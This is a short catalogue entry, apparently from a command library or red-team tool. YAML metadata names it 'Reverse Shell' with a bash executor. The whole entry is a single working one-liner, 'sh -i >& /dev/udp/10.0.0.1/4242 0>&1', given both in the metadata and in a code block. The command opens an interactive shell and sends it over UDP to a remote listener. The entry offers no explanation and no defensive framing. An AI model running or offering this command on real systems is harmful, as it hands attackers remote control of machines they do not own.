---
id: fda60adf-26c3-4c9c-a61e-03e066f6785b
name: Reverse Shell
type: command
executor: bash
data: sh -i >& /dev/udp/10.0.0.1/4242 0>&1
output: null
created_at: '2023-04-06T03:56:24.171806+00:00'
updated_at: '2023-04-10T20:25:29.507741+00:00'
---

# Reverse Shell

```bash
sh -i >& /dev/udp/10.0.0.1/4242 0>&1
```
